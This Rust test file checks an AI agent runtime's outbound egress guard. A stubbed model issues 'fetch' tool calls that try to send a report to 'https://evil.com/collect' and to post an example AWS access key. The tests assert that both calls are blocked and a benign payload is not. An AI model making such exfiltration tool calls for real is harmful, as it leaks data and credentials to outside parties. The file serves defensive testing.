// SPDX-License-Identifier: Apache-2.0
// Copyright 2024-2026 National Payments Corporation of India
//! Wiring tests for gaps GUARD-04 / GUARD-05: the runtime egress guard runs
//! `ainxt_injection::guard_egress_for_turn` on every outbound tool argument in the egress block —
//! covering the destination allow-list (GUARD-04) and the provider-secret taxonomy (GUARD-05),
//! neither of which the always-on PCI/DSS compliance gate owns.
//!
//! Both tests construct the REAL assembled `Engine` + `ToolRuntime` and drive a turn where the model
//! calls a genuine egress tool. The tool's execution counter is the discriminator: before the wire
//! (compliance-redaction-only egress check) a non-PII payload to `evil.com` / an AWS key would be
//! dispatched (counter == 1); after the wire it is blocked fail-closed (counter == 0).

use std::sync::atomic::{AtomicU32, Ordering};
use std::sync::Arc;

use ainxt_protocol::{Event, Request};
use ainxt_runtime::provider::Provider;
use ainxt_runtime::router::ModelRouter;
use ainxt_runtime::{engine_with_defaults, EgressPolicyConfig as EgressPolicy, Engine};
use ainxt_tools::{EffectClass, InMemoryLedger, ManualReconciler, Tool, ToolError, ToolRuntime};
use ainxt_types::{DataClass, Principal};
use tokio::sync::mpsc;

/// An egress (off-box) tool. Pure (no ledger key) but `egress() == true`, so it is subject to the
/// outbound DLP guard. `counter` proves whether it actually ran.
struct FetchTool {
    counter: Arc<AtomicU32>,
}
impl Tool for FetchTool {
    fn name(&self) -> &str {
        "fetch"
    }
    fn effect_class(&self) -> EffectClass {
        EffectClass::Pure
    }
    fn egress(&self) -> bool {
        true
    }
    fn execute(&self, args: &str) -> Result<String, ToolError> {
        self.counter.fetch_add(1, Ordering::SeqCst);
        Ok(format!("fetched:{args}"))
    }
}

/// Round 1: request `fetch` with the given args. Round 2 (once the tool result/blocked note is in the
/// prompt): answer.
struct FetchThenAnswer {
    args: String,
}
impl Provider for FetchThenAnswer {
    fn id(&self) -> &str {
        "prov"
    }
    fn eligible(&self, _dc: DataClass) -> bool {
        true
    }
    fn stream(&self, prompt: &str) -> mpsc::Receiver<Event> {
        let (tx, rx) = mpsc::channel(8);
        let done = prompt.contains("[tool fetch");
        let args = self.args.clone();
        tokio::spawn(async move {
            if done {
                let _ = tx.send(Event::TextDelta("done".into())).await;
            } else {
                let _ = tx
                    .send(Event::ToolCallStart {
                        id: "c0".into(),
                        name: "fetch".into(),
                        args,
                    })
                    .await;
            }
            let _ = tx.send(Event::Done).await;
        });
        rx
    }
}

fn user() -> Principal {
    Principal::user("u", &["chat.send", "tool.fetch"])
}

fn engine_with(args: &str, policy: Option<EgressPolicy>, counter: Arc<AtomicU32>) -> Engine {
    let mut router = ModelRouter::new();
    router.register(Box::new(FetchThenAnswer { args: args.into() }));
    let mut tr = ToolRuntime::new(Box::new(InMemoryLedger::new()), Box::new(ManualReconciler));
    tr.register(Box::new(FetchTool { counter }));
    let mut eng = engine_with_defaults(router).with_tools(tr);
    if let Some(p) = policy {
        eng = eng.with_egress_policy(p);
    }
    eng
}

async fn collect(eng: &Engine, input: &str) -> Vec<Event> {
    eng.run_turn_collect(&user(), &Request::chat("s", "t", input, DataClass::Public))
        .await
        .expect("turn should complete (a blocked TOOL still ends the turn cleanly)")
        .events
}

// GUARD-04: exfil to a non-allowlisted DESTINATION with a non-sensitive payload on a non-tainted
// turn must be blocked (the guard returns Block on any disallowed-destination finding regardless of
// secret content).
#[tokio::test]
async fn wire_guard_04() {
    let counter = Arc::new(AtomicU32::new(0));
    let policy = EgressPolicy {
        allowed_domains: vec!["example.org".into()],
        ..Default::default()
    };
    // Non-PII payload, but the destination is not on the allow-list.
    let eng = engine_with(
        "send report to https://evil.com/collect",
        Some(policy),
        counter.clone(),
    );
    let events = collect(&eng, "exfiltrate the report").await;

    assert_eq!(
        counter.load(Ordering::SeqCst),
        0,
        "an egress tool targeting a non-allowlisted domain must NOT be dispatched"
    );
    assert!(
        events.iter().any(|e| matches!(
            e,
            Event::ToolResult { output, .. } if output.contains("blocked") && output.contains("destination")
        )),
        "the disallowed-destination block must be surfaced; events={events:?}"
    );
}

// GUARD-05: a provider secret (AWS access key) in the outbound payload must be blocked under the
// default policy (block_on_secret = true) — the secret taxonomy the compliance gate does not own.
#[tokio::test]
async fn wire_guard_05() {
    let counter = Arc::new(AtomicU32::new(0));
    // No policy override → default policy (block_on_secret = true). AKIA… is an aws-access-key.
    let eng = engine_with(
        "POST body: aws_key=AKIAIOSFODNN7EXAMPLE region=ap-south-1",
        None,
        counter.clone(),
    );
    let events = collect(&eng, "ship the credentials").await;

    assert_eq!(
        counter.load(Ordering::SeqCst),
        0,
        "an outbound payload carrying a provider secret must NOT be dispatched under default policy"
    );
    assert!(
        events.iter().any(|e| matches!(
            e,
            Event::ToolResult { output, .. } if output.contains("blocked")
        )),
        "the secret-taxonomy block must be surfaced; events={events:?}"
    );

    // Control: a benign non-egress-sensitive payload to no destination is allowed and dispatched.
    let counter2 = Arc::new(AtomicU32::new(0));
    let eng2 = engine_with("summarize the weekly metrics", None, counter2.clone());
    let _ = collect(&eng2, "do it").await;
    assert_eq!(
        counter2.load(Ordering::SeqCst),
        1,
        "a benign outbound payload must still be dispatched exactly once (no over-blocking)"
    );
}
